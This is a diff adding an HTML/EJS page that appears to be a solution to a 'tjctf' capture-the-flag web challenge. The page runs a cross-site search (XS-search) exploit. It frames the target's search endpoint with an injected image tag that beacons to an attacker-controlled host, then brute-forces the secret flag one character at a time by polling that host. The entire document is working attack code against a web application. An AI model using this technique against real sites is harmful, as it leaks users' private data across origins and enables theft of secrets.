@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<iframe id="xs-search" width=500 height=500>
+</iframe>
+
+<script>
+  const WAIT_TIME = 400
+
+  const iframe = document.getElementById("xs-search")
+  const attacker = "<%= locals.attacker %>"
+  const target = "<%= locals.target %>"
+
+  const createPayload = (str) => `${str}, <img src="${attacker}/set?query=${str}" />`
+
+  let currentQuery = "tjctf{"
+  let charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789_{}"
+
+  async function getValue() {
+    let response = await fetch(`${attacker}/currentQuery`)
+    return (await response.json()).value
+  }
+
+  async function checkQueryChanged() {
+    const newVal = await getValue()
+    return currentQuery !== newVal
+  }
+
+  async function handleQuery(query, index) {
+    if (await checkQueryChanged()) {
+      console.log("SUCCESS: " + query)
+      currentQuery = query
+      vuln(query, 0)
+    } else {
+      console.log(query)
+      vuln(currentQuery, index + 1)
+    }
+  }
+
+  function vuln(query, index) {
+    let nQuery = query + charset.charAt(index)
+    const vulnURL = `${target}/search?search=${encodeURI(createPayload(nQuery))}`
+    iframe.src = vulnURL
+    setTimeout(async () => {
+      await handleQuery(nQuery, index)
+    }, WAIT_TIME)
+  }
+
+  vuln(currentQuery, 0)
+
+</script>
